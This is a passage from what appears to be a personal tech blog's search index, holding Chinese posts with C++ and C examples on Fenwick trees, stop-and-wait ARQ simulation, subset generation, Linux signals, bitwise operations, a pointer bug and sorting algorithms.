preSum[i] 的值，为常数时间。\n前缀和方法在数组元素不发生改变的情况下十分高效，但如果数组元素可能会发生改变，与朴素求和做法（不使用前缀和数组，而是直接遍历区间元素累计求和）相比，前缀和数组需要 O(n) 的时间来进行更新。这两种做法要么查询是 O(1)、更新是 O(n)，要么查询是 O(n)、更新是 O(1)，那有没有一种折衷的方案，使得查询和更新效率都不至于太低呢？本文将介绍的树状数组就符合这样的条件。\n\n树状数组查询由正整数的二进制表示可知，任何一个正整数都可以拆分为为若干个不重复的 2 的幂之和。那么对于一个下标从 1 开始且长度为 n 的数组，它的任意下标 i (1 &lt;= i &lt; n) 也可以依照此方案进行拆分，例如 7 = 4 + 2 + 1，那么对于一个区间 [1 ~ 7]，令被拆分得到的各整数为区间长度，按照从大到小的顺序，依次从左到右对区间进行分割，得到的各子区间为 [1 ~ 4]、[5 ~ 6] 和 [7 ~ 7]。这样分割具备一个非常好的性质：\n对于分割后得到的任何子区间 [l, r]，r 必定唯一，且 r 的个数正好等于 n.\n也就是说不存在两个子区间 [l1, r1]、[l2, r2] 满足：r1 = r2 且 l1 ≠ l2. 那么就可以以 r 为关键字（下标），构造一个数组 tree，tree[r] 表示区间 [l, r] （若 r 确定，则 l 也确定）的元素和。那么根据 7 = 4 + 2 + 1，有 preSum[7] = tree[4] + tree[6] + tree[7]。如下图所示，图中给出了对下标 1 ~ 16 进行拆分的结果。\n\n由于任何一个正整数 i 拆分后的整数数为其二进制表示中 1 的个数，令该个数为 ns，对于区间 [1, i]，其拆分得到区间个数也为 ns，即 preSum[i] 最多由 ns 个 tree 数组元素累加得到，因此前缀和的查询效率为 O(logn). \n更新上图中的连接线代表了 nums 数组元素（黄色方格）和 tree 数组元素（蓝色方格）以及不同 tree 数组元素之间的相互依赖关系，若 nums 数组元素发生改变，便需要根据上述依赖关系自底向上对 tree 数组元素进行更新，以保证查询的正确性，问题就在于如何用规范的数学语言表示图中所示的依赖关系。\n既然区间的分割主要基于二进制的位级表示，那么元素更新的依赖关系也不妨从二进制的角度出发。首先观察下标 9 的更新路径：9 -&gt; 10 -&gt; 12 -&gt; 16，其二进制表示分别为：\n 9: 0100110: 0101012: 0110016: 10000\n似乎有 10 = 9 + 1，12 = 10 + 2，16 = 12 + 4 的关系存在。其中下标每次增加的值都为 2 的幂，且该 2 的幂即为当前下标 i 按上述规则拆分后得到的最小的数字。事实也的确如此（具备数学证明可以参考带你发明树状数组！附数学证明），这个最小数字通常称为一个数的 lowbit，即 lowbit[9] = 1、lowbit[10] = 2、lowbit[12] = 4。\n得到这个规律后，更新操作便很容易了：若 nums[i] 改变，则首先更新 tree[i]，然后 i += lowbit(i)，继续更新 tree[i]，直到 i 超出了数组的范围，更新结束。注意到，lowbit[i] 在更新过程中是不断增大的，因此更新次数最多不超过 logn 次，即 tree 数组的更新效率为 O(logn).\n构造了解了如何根据 tree 数组计算前缀和以及如何更新 tree 数组后，接下来的问题就是如何初始化 tree 数组的值。一个简单的做法是先将 tree 数组各元素初始化为 0，再依次对每个 nums[i] 执行更新操作，这种方法的时间复杂度为 O(nlogn)。\n注意 tree 数组的下标代表分割区间的右端点位置，如果当前更新到了下标 i 的位置，那么说明 tree[i] 的值已经初始化完毕（nums[j](j &gt; i) 与 tree[i] 无关），因此可直接将该值加入 tree[i + lowbit(i)] 中。\n代码实现class binaryIndexedTree &#123;private:\tvector&lt;int&gt; tree;\tvector&lt;int&gt; nums;public:\tbinaryIndexedTree(vector&lt;int&gt;&amp; nums) : nums(nums), tree(nums.size() + 1) &#123;\t\tfor (int i = 1; i &lt;= nums.size(); ++i) &#123;\t\t\ttree[i] += nums[i - 1];\t\t\tint next = i + (i &amp; -i); // i &amp; -i 即为 lowbit(i)\t\t\tif (next &lt;= nums.size()) &#123;\t\t\t\ttree[next] += tree[i];\t\t\t&#125;\t\t&#125;\t&#125;\tvoid update(int idx, int val) &#123;\t\tint dv = val - nums[idx];\t\tnums[idx] = val;\t\tfor (int i = idx + 1; i &lt; tree.size(); i += i &amp; -i) &#123;\t\t\ttree[i] += dv;\t\t&#125;\t&#125;\tint preSum(int idx) &#123;  // 区间 nums[0~idx) 的和\t\tint sum = 0;\t\twhile (idx &gt; 0) &#123;\t\t\tsum += tree[idx];\t\t\tidx -= (idx &amp; -idx);\t\t&#125;\t\treturn sum;\t&#125;&#125;;\n","categories":["数据结构与算法"],"tags":["算法","数据结构"]},{"title":"停止等待协议的模拟实现","url":"/2022/05/05/%E5%81%9C%E6%AD%A2%E7%AD%89%E5%BE%85%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/","content":"协议原理\n设计思路基本传输本次实验我采用了程序模拟的方式实现。发送方和接收方都为一个数组，传输过程即为发送方数组向接收方数组传递数据，并使用随机数生成的方式模拟传输过程中可能出现的差错，并且传输时间也为一个在 50 - 150 ms 间的随机数，用一个迭代器来模拟此时发送方的数据位置。\n传输过程为一个循环语句，终止条件为发送迭代器到达发送方数组的末尾位置。\n选择重传每次进行传输，传输时间就会累加，在一轮传输的最后判断累计时间是否超过了规定 tout，如果未超过，代表数据成功接收，发送迭代器自增 1。 否则，不进行操作，下一次循环将会再次尝试发送该数据。\n舍弃重复帧存在这么一种情况，接收方成功接收了发送方的数据，并返回了一个 ACK 帧，但是此 ACK 帧还未到达发送方就已被其判定为超时，那么发送方将会重新发送上一次的数据帧，若该数据帧成功到达接收方，那么接收方需要将该数据帧舍弃（因此上一次传输时接收方已成功接受了该数据帧）。实现方法是判断接受数组的最后一个元素（即上一次接收的元素）是否与此时接受的相同，若相同，则不接收，并重新发送 ACK 帧。\n代码实现#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;vector&gt;#include&lt;Windows.h&gt;using namespace std;struct myData&#123;\tint bin;\tstring str;\tmyData(int b, string s) : bin(b), str(s) &#123;&#125;&#125;;class ARQ &#123;public:\tvoid transmitData(vector&lt;myData&gt;&amp; reciver, vector&lt;myData&gt;&amp; sender) &#123;\t\tsrand((unsigned int)time(NULL));\t\tauto itSender = sender.cbegin();\t\twhile (itSender != sender.cend()) &#123;\t\t\tint sendBin = rand() % 2; // 传输过程数据可能出错\t\t\tdouble transTime = rand() % 101 + 50; // 随机传输时间为 50 - 150 ms\t\t\tmyData sendData(sendBin, itSender-&gt;str); // 取数据帧\t\t\tcout &lt;&lt; &quot;sender: 正在发送第 &quot; &lt;&lt; itSender - sender.cbegin() &lt;&lt; &quot; 帧...&quot; &lt;&lt; endl;\t\t\tSleep(transTime); // 数据传输过程\t\t\tbool isRight = sendData.bin; // 检错\t\t\tif (!reciver.empty() &amp;&amp; reciver.back().str == sendData.str) &#123; // 舍弃重复帧\t\t\t\tcout &lt;&lt; &quot;reciver: 丢弃重复帧，准备重新发送 ACK 帧。&quot; &lt;&lt; endl;\t\t\t\tisRight = true;\t\t\t\ttransTime += rand() % 101 + 50;\t\t\t\tcout &lt;&lt; &quot;reciver: 正在发送 ACK 帧...&quot; &lt;&lt; endl;\t\t\t\tSleep(transTime);\t\t\t&#125;\t\t\telse if (isRight) &#123; // 数据正确\t\t\t\treciver.emplace_back(sendData); // 接收数据\t\t\t\tcout &lt;&lt; &quot;reciver: 数据成功接收，准备发送 ACK 帧。&quot; &lt;&lt; endl;\t\t\t\ttransTime += rand() % 101 + 50;\t\t\t\tcout &lt;&lt; &quot;reciver: 正在发送 ACK 帧...&quot; &lt;&lt; endl;\t\t\t\tSleep(transTime);\t\t\t&#125;\t\t\telse &#123; // 数据错误\t\t\t\tcout &lt;&lt; &quot;reciver: 数据错误，发送 NAK 帧。&quot; &lt;&lt; endl;\t\t\t\ttransTime += rand() % 101 + 50;\t\t\t\tcout &lt;&lt; &quot;reciver: 正在发送 NAK 帧...&quot; &lt;&lt; endl;\t\t\t\tSleep(transTime);\t\t\t&#125;\t\t\tif (transTime &lt; 250) &#123; // 未超时\t\t\t\tif (isRight) &#123;\t\t\t\t\tcout &lt;&lt; &quot;sender: 成功接收 ACK 帧，准备发送下一帧。&quot; &lt;&lt; endl &lt;&lt; endl;\t\t\t\t\t++itSender;\t\t\t\t&#125;\t\t\t\telse &#123;\t\t\t\t\tcout &lt;&lt; &quot;sender: 成功接收 NAK 帧，准备重传。&quot; &lt;&lt; endl &lt;&lt; endl;\t\t\t\t&#125;\t\t\t&#125;\t\t\telse &#123; // 传输超时\t\t\t\tcout &lt;&lt; &quot;sender: 超时，准备重传。&quot; &lt;&lt; endl &lt;&lt; endl;\t\t\t&#125;\t\t&#125;\t&#125;&#125;;int main() &#123;\tARQ arq;\tvector&lt;myData&gt; reciver; // 初始时接收方为空\tvector&lt;myData&gt; sender = &#123; myData(1, &quot;Hello&quot;),myData(1,&quot;World&quot;), myData(1, &quot;!&quot;) &#125;; // 初始化发送方\tarq.transmitData(reciver, sender);\tcout &lt;&lt; &quot;---------------------------------&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;数据传输结束，以下为接收者收到的数据：&quot; &lt;&lt; endl;\tfor (const auto&amp; s : sender) &#123;\t\tcout &lt;&lt; s.bin &lt;&lt; &quot; &quot; &lt;&lt; s.str &lt;&lt; endl;\t&#125;&#125;\n运行效果\n","categories":["计算机网络"],"tags":["算法","计算机网络"]},{"title":"子集生成算法","url":"/2022/03/16/%E5%AD%90%E9%9B%86%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95/","content":"本文介绍生成一个集合子集的两种常见算法，借此从中深入理解搜索问题中常见的两种思路。\n\n递归回溯思路对于集合中的每个元素，我们都有选择和不选择两种处理方式，这种思路类似于二叉树的遍历，每种情况都向下衍生出两种情况，最终当遍历到下标 index = nums.size() 时，将生成的子集保存。\n由于此处我们使用一个数组的引用来保存子集元素，因此在递归回溯时，我们需要手动将上一步中加入添加的元素去除，来回溯到该元素未被选择的状态。\n代码class Solution &#123;private:\tstd::vector&lt;std::vector&lt;int&gt;&gt; Sets;\tvoid search(std::vector&lt;int&gt;&amp; subset, std::vector&lt;int&gt;&amp; nums, int index) &#123;\t\tif (index == nums.size()) &#123;\t\t\tSets.emplace_back(subset);\t\t\treturn;\t\t&#125;\t\tsubset.emplace_back(nums[index]);\t\tsearch(subset, nums, index + 1);\t\tsubset.pop_back();\t\tsearch(subset, nums, index + 1);\t&#125;public:\tstd::vector&lt;std::vector&lt;int&gt;&gt; getSubset(std::vector&lt;int&gt;&amp; nums) &#123;\t\tstd::vector&lt;int&gt; subset;\t\tsearch(subset, nums, 0);\t\treturn Sets;\t&#125;&#125;;\n状态压缩思路我们知道，一个集合的非空子集个数为 2n - 1，因此可以将子集状态表示为一个范围在 [1, 2n] 的二进制数。\n二进制数位 ai 若为 0，表示第 i 位未被选中；若为 1，表示第 i 位被选中。而要分析一个压缩的状态，即获取表示该状态二进制数各位的值，可以运用位运算的操作。由于一个二进制数和 1 进行按位与（&amp;）操作得到的结果将只由该数的最低位决定，如果最低位为 0，则运算结果为 0，否则为 1. 由此可以想到，将一个状态数依次右移 n 位得到一个以 an 结尾的二进制数，再将该二进制数和 1 进行按位与得到 an 的值。依次遍历所有的右移步数得到该状态的所有信息。\n代码class Solution &#123;private:\tstd::vector&lt;std::vector&lt;int&gt;&gt; Sets;public:\tstd::vector&lt;std::vector&lt;int&gt;&gt; getSubset(std::vector&lt;int&gt;&amp; nums) &#123;\t\tint n = nums.size();\t\tstd::vector&lt;int&gt; subset;\t\tfor (int i = 1; i &lt;= (1 &lt;&lt; n); ++i) &#123;\t\t\tsubset.clear();\t\t\tfor (int j = 0; j &lt; n; ++j) &#123;\t\t\t\tint isChoosed = i &gt;&gt; j &amp; 1;\t\t\t\tif (isChoosed)\t\t\t\t\tsubset.emplace_back(nums[j]);\t\t\t&#125;\t\t\tSets.emplace_back(subset);\t\t&#125;\t\treturn Sets;\t&#125;&#125;;\n","categories":["数据结构与算法"],"tags":["算法","数据结构"]},{"title":"关于Linux信号的一些思考","url":"/2025/09/13/%E5%85%B3%E4%BA%8ELinux%E4%BF%A1%E5%8F%B7%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/","content":"今天偶然间看到一个介绍 Linux 信号的视频：别再杀进程了！让 Ctrl+C 变成“喵”…（用信号实现）哔哩哔哩_bilibili ，虽然讲的东西很基础，但也引发了我思考一些之间没有很关注的问题。在与 LLM “讨论” 一番过后，便想将这些思考记录下来，算是查漏补缺吧。\n\n信号的一面有关信号的具体用法，不是本文关注的重点，这部分内容可以翻看《深入理解计算机系统》（CSAPP）的异常控制流章节，这也是我最早建立对“信号”认识的地方。\n先下定义：信号的本质是操作系统提供的一种进程间通信（IPC）机制，其他两种主要的进程间通信进制为共享内存和消息传递。\n\n其中管道通常也被认为是一种特殊的消息传递机制，它们的核心设计都是不依赖于两个进程（以下称作 A 和 B）共享一段内存空间，而是将内核作为一个中间层，将数据代为转发，即 A -&gt; kernel -&gt; B。只不过常规的消息传递转发的是结构化的数据，而管道通常直接进行数据流的传递。\n\n与共享内存和消息传递不同，信号通常并不直接传送数据，而是传达一系列预设编号的通知，进程在收到通知后，根据通知类别的不同，进行分发处理。简单类比就像是进程与进程之间的 “syscall” 一样，很直觉的设计。\n信号的另一面我这里更想要介绍的是，信号作为一个间接层，为操作系统的进程管理带来了更大的灵活性。具体我们可以看下面这个有趣的程序案例：\n#include &lt;stdio.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;// 自定义 SIGFPE 信号处理函数void sigfpe_handler(int signum) &#123;    const char *msg = &quot;Caught SIGFPE (Division by zero attempt)! Process continues.\\n&quot;;    write(STDOUT_FILENO, msg, 55);&#125;int main() &#123;    // 设置 SIGFPE 的信号处理函数    if (signal(SIGFPE, sigfpe_handler) == SIG_ERR) &#123;        perror(&quot;Error setting up SIGFPE handler&quot;);        return 1;    &#125;    printf(&quot;Program started. Attempting division by zero...\\n&quot;);    int a = 10;    int b = 0;    int c;    // 触发除零异常    c = a / b;    printf(&quot;This line might not be reached if the exception persists. c = %d\\n&quot;, c);    // 保持程序运行以便观察    while(1) &#123;        sleep(1);    &#125;    return 0;&#125;\n上述程序会在代码 c = a / b; 处触发除零异常，通常的想法可能是程序在此之后便会直接退出。我们尝试运行该程序，结果如下：\n\n程序将会反复收到 SIGFPE 信号，并调用相应的信号处理函数，而始终没有退出，直到我们手动按下键盘 ctrl + c 向进程发送 SIGINT 信号，由于进程没有对该信号的处理函数进行定义，使得其执行了默认例程——也就是退出。\n我们对程序运行的过程进行梳理：首先代码 c = a / b; 触发了除零异常，CPU 将自动设置其 PC 寄存器值，并跳转到内核的异常处理函数中执行，并对不同的异常类型进行分发处理。在确认本次异常的原因为算术异常，此时内核并不会选择直接将进程杀死，而是向其发送一个 SIGFPE 信号，随后在恢复到进程被中断指令处执行前，对待处理信号 SIGFPE 进行处理，即调用其自定义的信号处理函数：打印相关信息。在全部信号处理完成后，恢复到 c = a / b 处重新执行，然后再次触发除零异常，以此往复……\n根据上面的描述，可以看到之所以程序没有按照推测的那样直接退出，是因为内核在对该异常的处理没有选择直接杀死，选择了转发信号，告知进程“你刚刚触发了一个算术异常”，进程可以自行选择对该异常的处理方式，合理的做法自然是打印提示信息后退出程序，但是我们选择仅打印提示信息，这就导致反复触发该算术异常，造成“死循环”。\n可以看到，信号机制也可以看作是操作系统提供的一种将事件（包括异常和中断）处理“分发”给用户进程自行完成的机制。这样的设计改变了内核总揽全局的做法，赋予了进程更大的自主权，也带来了更大的灵活性。\n\n对于一些没有信号机制的操作系统，它们在遇到上述情况时的选择则是直接在内核的异常处理函数中进行统一处理，比如教学操作系统 xv6 中：\nuint64usertrap(void)&#123;  [...]  if(r_scause() == 8)&#123;    // system call    if(killed(p))      kexit(-1);    // sepc points to the ecall instruction,    // but we want to return to the next instruction.    p-&gt;trapframe-&gt;epc += 4;    // an interrupt will change sepc, scause, and sstatus,    // so enable only now that we&#x27;re done with those registers.    intr_on();    syscall();  &#125; else if((which_dev = devintr()) != 0)&#123;    // ok  &#125; else if((r_scause() == 15 || r_scause() == 13) &amp;&amp;            vmfault(p-&gt;pagetable, r_stval(), (r_scause() == 13)? 1 : 0) != 0) &#123;    // page fault on lazily-allocated page  &#125; else &#123;    printf(&quot;usertrap(): unexpected scause 0x%lx pid=%d\\n&quot;, r_scause(), p-&gt;pid);    printf(&quot;            sepc=0x%lx stval=0x%lx\\n&quot;, r_sepc(), r_stval());    setkilled(p);  &#125;  [...]&#125;\n可以看到，它在遇到算术异常时的选择，就是直接将进程杀死。\n\n","categories":["操作系统"],"tags":["操作系统","Linux","进程间通信"]},{"title":"位运算基础及应用","url":"/2021/09/26/%E4%BD%8D%E8%BF%90%E7%AE%97%E5%9F%BA%E7%A1%80%E5%8F%8A%E5%BA%94%E7%94%A8/","content":"计算机中的数据以二进制的形式存储，即0、1两种状态。位运算就是直接对整数在内存中的二进制位进行操作。本文将介绍位运算的各操作符以及常见应用。\n\n操作符&amp;（与）参加运算的两个数据，按二进制位进行与运算。（两位都为1时才为1，否则为0）\n例如 12 和 5 两个数，二进制形式分别为 1100、0101. 逐个按位进行与运算得：0100 = 4. 即 12 &amp; 5 = 4.\n|（或）参加运算的两个数据，按二进制位进行或运算。（两位都为0时才为0，否则为1）\n例如 12 和 5 两个数，二进制形式分别为 1100、0101. 逐个按位进行或运算得：1101 = 13. 即 12 | 5 = 13.\n^（异或）参加运算的两个数据，按二进制位进行异或运算。（相同为0，不同为1）\n例如 12 和 5 两个数，二进制形式分别为 1100、0101. 逐个按位进行异或运算得：1001 = 9. 即 12 ^ 5 = 9.\n~（取反）参加运算的数据，其各二进制位进行取反运算。（0变成1，1变成0）\n例如 5，对于一个 int16 型数据，它的二进制形式为 0 000 0000 0000 0101. 取反后得：1 111 1111 1111 1010（符号位为 1，为负数）将此补码转换为原码得：1 000 0000 0000 0110，十进制为 -6. 即 ~5 = -6.\n&lt;&lt;（左移）参加运算的数据，其各二进制位向左进行移位操作，高位丢弃，低位补0.\n例如 5，对于一个 int16 型数据，它的二进制形式为 0 000 0000 0000 0101. 左移 3 位后得：0 000 0000 0010 1000 = 40.\n即 5 &lt;&lt; 3 = 40.\n&gt;&gt;（右移）参加运算的数据，其各二进制位向右进行移位操作，低位丢弃，对于无符号数，高位补 0，对于有符号数，高位补原来的符号位。\n\n例如 5，对于一个 int16 型数据，它的二进制形式为 0 000 0000 0000 0101. 左移 2 位后得：0 000 0000 0000 0001 = 1. 即 5 &gt;&gt; 2 = 1.\n例如 -5，对于一个 int16 型数据，它的二进制形式为 1 111 1111 1111 1011. 右移 2 位后得：1 111 1111 1111 1110 = -2. 即 -5 &gt;&gt; 2 = -2.\n\n常见应用左移、右移实现乘除法由左移、右移的定义可知，一个二进制数 0000 1010 左移两位后为 0010 1000 = 25 * 23 = 22 * (23 * 21). 由此可见，在数据未溢出的情况下，左移 n 位，相当于原数的值乘以 2n. \n同理，右移相当于除以 2n.\n异或判断两数符号的异同判断两个有符号数是同号还是异号，我们可以用条件控制语句进行判断；也可以将两数相乘判断积的正负；同样也可以使用异或运算符。\n由于有符号数最高位为符号位，因此在进行异或运算时，两数的符号位也将参与运算。若两数的符号位相同，则异或结果 res 的符号位为 0，即 res &gt;= 0; 若两数的符号位不同，则异或结果 res 的符号位为 1，即 res &lt; 0.\nbool isSameSign(int a, int b) &#123;    int res = a ^ b;    return res &gt;= 0 ? true : false;&#125;\n与运算判断数的奇偶性和异或判断两数符号异同类似原理类似，根据二进制数的最低位是 1 还是 0 来判断该数是奇数还是偶数。\n要判断一个数 a 的奇偶性，可以先计算 res = a &amp; 1 的值。若 res = 0，则为偶数；若 res = 1，则为奇数。\nbool isOdd(int a)&#123;    int res = a &amp; 1;    return res == 1 ? true : false;&#125;\n","categories":["计算机基础"],"tags":["C++","位运算"]},{"title":"循环语句中指针赋值出错","url":"/2022/03/30/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%E4%B8%AD%E6%8C%87%E9%92%88%E8%B5%8B%E5%80%BC%E5%87%BA%E9%94%99/","content":"最近在写人工智能作业的时候遇到了一点问题，就是在循环语句中对指针类型赋值出现错误，导致所有的结点的前驱指针最终指向自身。\n问题描述以下使用一个简单的示例来模拟当时出现的问题。\nMyStruct 为一个自定义结构体类型，包含数据成员 val 和前驱结点 pre。首先将初始结点(0，nullptr)加入队列 Q，随后在每次循环中，用变量 fs 接收队列 Q 的队首元素并将其出队，并根据该结点生成一个新结点，该新结点 val = fs.val + 1，且将其前驱结点设为 fs 并加入到队列 Q 中。直到 fs.val &gt;= 5 时退出循环。\nstruct MyStruct&#123;\tint val;\tMyStruct* pre;\tMyStruct(int v = 0, MyStruct* p = nullptr) : val(v), pre(p) &#123;&#125;&#125;;int main()&#123;\tstd::queue&lt;MyStruct&gt; Q;\tQ.emplace(0, nullptr);\tMyStruct target;\twhile (!Q.empty()) &#123;\t\tMyStruct fs = Q.front();\t\tQ.pop();\t\tif (fs.val &gt;= 5) &#123;\t\t\ttarget = fs;\t\t\tbreak;\t\t&#125;\t\tQ.emplace(fs.val + 1, &amp;fs);\t&#125;\tstd::cin.get();&#125;\n如果代码运行如我们预期，最终将会得到一个 val 为 5 的结点，并且其前驱为一个 val 为 4 的结点，以此类推，形成一个 val 从 5 到 0 的链表。但事实上，最终结点之间并没有彼此相连，结点 target 的 pre 为自身。\n\n问题原因如果仔细观察，变量 fs 在整个循环过程中都占用同一片内存空间，而子节点的前驱结点 pre 直接指定为了 fs 的地址，那么如果 fs 的值遭到改变，即该地址的数据被改变，那么结点的前驱结点 pre 也会被改变。即下次循环执行 MyStruct fs = Q.front(); 后结点的前驱结点就遭到了改变，且指向了自身。\n解放方法由于 fs 的始终占用一片内存空间，为了防止因 fs 的数据被改变而使得结点前驱结点数据遭到改变，可以为结点的前驱结点重新开辟一片内存空间并赋予当前 fs 的数据。\n\n","categories":["经验"],"tags":["经验","C++","数据结构与算法"]},{"title":"开始写个人博客了","url":"/2021/05/06/%E5%BC%80%E5%A7%8B%E5%86%99%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E4%BA%86/","content":"博客搭建经过两天的折腾，利用Hexo框架和github托管的方式搭建的静态博客也算有了个雏形，这两天将继续对其进行美化以及添加新功能，今后打算在这里不定期分享一些自己感兴趣的编程、数码、游戏相关的内容。\n搭建博客的目的一方面是想锻炼自己的表达能力（我在这方面确实有所欠缺），另一方面也是想将自己感兴趣的内容分享出去，既加深了自己对知识的理解，也能让他人学到新东西。\n博客的内容包含但不限于编程、游戏、数码相关内容，只要是我觉得有分享价值的东西，都有可能出现在博文中。\n","categories":["经验"],"tags":["经验","博客"]},{"title":"常见排序算法","url":"/2023/08/22/%E5%B8%B8%E8%A7%81%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/","content":"插入排序直接插入void insertSort(vector&lt;int&gt;&amp; nums) &#123;\tfor (int i = 1; i &lt; nums.size(); ++i) &#123;\t\tint j = i;\t\twhile (j &gt;= 1 &amp;&amp; nums[j] &lt; nums[j - 1]) &#123;\t\t\tswap(nums[j], nums[j - 1]);\t\t\t--j;\t\t&#125;\t&#125;&#125;\n折半插入void binaryInsertSort(vector&lt;int&gt;&amp; nums) &#123;\tfor (int i = 1; i &lt; nums.size(); ++i) &#123;\t\tint key = nums[i];\t\tint low = 0, high = i - 1;\t\twhile (low &lt;= high) &#123;\t\t\tint mid = low + (high - low) / 2;\t\t\tif (nums[mid] &gt;= key) &#123;\t\t\t\thigh = mid - 1;\t\t\t&#125;\t\t\telse &#123;\t\t\t\tlow = mid + 1;\t\t\t&#125;\t\t&#125;\t\tfor (int k = i - 1; k &gt;= low; --k)  &#123;\t\t\tnums[k + 1] = nums[k];\t\t&#125;\t\tnums[low] = key;\t&#125;&#125;\n希尔排序void shellSort(vector&lt;int&gt;&amp; nums) &#123;\tint n = nums.size();\tfor (int dk = n / 2; dk &gt;= 1; dk /= 2) &#123;\t\tfor (int i = dk; i &lt; n; ++i) &#123;\t\t\tint j = i;\t\t\twhile (j &gt;= dk &amp;&amp; nums[j] &lt; nums[j - dk]) &#123;\t\t\t\tswap(nums[j], nums[j - dk]);\t\t\t\tj -= dk;\t\t\t&#125;\t\t&#125;\t&#125;&#125;\n冒泡排序void bubbleSort(vector&lt;int&gt;&amp; nums) &#123;\tfor (int i = nums.size() - 1; i &gt; 0; --i) &#123;\t\tfor (int j = 0; j &lt; i; ++j) &#123;\t\t\tif (nums[j] &gt; nums[j + 1]) &#123;\t\t\t\tswap(nums[j], nums[j + 1]);\t\t\t&#125;\t\t&#125;\t&#125;&#125;\n快速排序int partition(vector&lt;int&gt;&amp; nums, int left, int right) &#123;    // 设定随机pivot\tint randIdx = rand() % (right - left + 1) + left;\tswap(nums[left], nums[randIdx]);\tint pivot = nums[left];\twhile (left &lt; right) &#123;\t\twhile (left &lt; right &amp;&amp; nums[right] &gt;= pivot) --right;\t\tnums[left] = nums[right];\t\twhile (left &lt; right &amp;&amp; nums[left] &lt;= pivot) ++left;\t\tnums[right] = nums[left];\t&#125;\tnums[left] = pivot;\treturn left;&#125;void recurSort(vector&lt;int&gt;&amp; nums, int left, int right) &#123;\tif (left &gt; right) return;\tint p = partition(nums, left, right);\trecurSort(nums, left, p - 1);\trecurSort(nums, p + 1, right);&#125;void quickSort(vector&lt;int&gt;&amp; nums) &#123;\tsrand((unsigned)time(nullptr));\trecurSort(nums, 0, nums.size() - 1);&#125;\n简单选择排序void selectSort(vector&lt;int&gt;&amp; nums) &#123;\tfor (int i = 0; i &lt; nums.size(); ++i) &#123;\t\tint minIdx = i;\t\tfor (int j = i + 1; j &lt; nums.size(); ++j) &#123;\t\t\tif (nums[minIdx] &gt; nums[j]) &#123;\t\t\t\tminIdx = j;\t\t\t&#125;\t\t&#125;\t\tswap(nums[i], nums[minIdx]);\t&#125;&#125;\n堆排序void headAjust(vector&lt;int&gt;&amp; nums, int i, int len) &#123;\twhile (i * 2 + 1 &lt;= len) &#123;\t\tint left = i * 2 + 1, right = i * 2 + 2;\t\tint largest = i;\t\tif (left &lt;= len &amp;&amp; nums[left] &gt; nums[i]) &#123;\t\t\tlargest = left;\t\t&#125;\t\tif (right &lt;= len &amp;&amp; nums[right] &gt; nums[largest]) &#123;\t\t\tlargest = right;\t\t&#125;\t\tif (largest == i) break;\t\tswap(nums[i], nums[largest]);\t\ti = largest;\t&#125;&#125;void heapSort(vector&lt;int&gt;&amp; nums) &#123;    // 构建最大堆\tint len = nums.size() - 1;\tfor (int i = len / 2; i &gt;= 0; --i) &#123;\t\theadAjust(nums, i, len);\t&#125;\tfor (int i = len; i &gt; 0; --i) &#123;\t\tswap(nums[i], nums[0]);\t\theadAjust(nums, 0, --len);\t&#125;&#125;\n归并排序void merge(vector&lt;int&gt;&amp; nums, int low, int mid, int high) &#123;\tvector&lt;int&gt; numsCpy(high - low + 1);\tint p1 = low, p2 = mid + 1, p3 = 0;\twhile (p1 &lt;= mid &amp;&amp; p2 &lt;= high) &#123;\t\tif (nums[p1] &lt;= nums[p2]) &#123;\t\t\tnumsCpy[p3++] = nums[p1++];\t\t&#125;\t\telse &#123;\t\t\tnumsCpy[p3++] = nums[p2++];\t\t&#125;\t&#125;\twhile (p1 &lt;= mid) numsCpy[p3++] = nums[p1++];\twhile (p2 &lt;= high) numsCpy[p3++] = nums[p2++];\tfor (int i = 0; i &lt; numsCpy.size(); ++i) &#123;\t\tnums[low++] = numsCpy[i];\t&#125;&#125;void recurSort(vector&lt;int&gt;&amp; nums, int low, int high) &#123;\tif (low &gt;= high) return;\tint mid = low + (high - low) / 2;\trecurSort(nums, low, mid);\trecurSort(nums, mid + 1, high);\tmerge(nums, low, mid, high);&#125;void mergeSort(vector&lt;int&gt;&amp; nums) &#123;\trecurSort(nums, 0, nums.size() - 1);&#125;\n基数排序// 本排序算法仅适用于整数排序void countingSort(vector&lt;int&gt;&amp; nums, int exp) &#123;\tint n = nums.size();\tvector&lt;int&gt; output(n);\tvector&lt;int&gt; count(10, 0);\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tint digit = (nums[i] / exp) % 10;\t\t++count[digit];\t&#125;\tfor (int i = 1; i &lt; 10; ++i) &#123;\t\tcount[i] += count[i - 1];\t&#125;\tfor (int i = n - 1; i &gt;= 0; --i) &#123;\t\tint digit = (nums[i] / exp) % 10;\t\toutput[count[digit] - 1] = nums[i];\t\t--count[digit];\t&#125;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tnums[i] = output[i];\t&#125;&#125;void radixSort(vector&lt;int&gt;&amp; nums) &#123;\tint n = nums.size();\tvector&lt;int&gt; positiveNums;\tvector&lt;int&gt; negativeNums;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tif (nums[i] &gt;= 0) &#123;\t\t\tpositiveNums.emplace_back(nums[i]);\t\t&#125;\t\telse &#123;\t\t\tnegativeNums.emplace_back(-1 * nums[i]);\t\t&#125;\t&#125;\tif (!positiveNums.empty()) &#123;\t\tint maxVal = *max_element(positiveNums.begin(), positiveNums.end());\t\tfor (int exp = 1; maxVal / exp &gt; 0; exp *= 10) &#123;\t\t\tcountingSort(positiveNums, exp);\t\t&#125;\t&#125;\tif (!negativeNums.empty()) &#123;\t\tint maxVal = *max_element(negativeNums.begin(), negativeNums.end());\t\tfor (int exp = 1; maxVal / exp &gt; 0; exp *= 10) &#123;\t\t\tcountingSort(negativeNums, exp);\t\t&#125;\t&#125;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tif (i &lt; negativeNums.size()) &#123;\t\t\tnums[i] = -1 * negativeNums[negativeNums.size() - i - 1];\t\t&#125;\t\telse &#123;\t\t\tnums[i] = positiveNums[i - 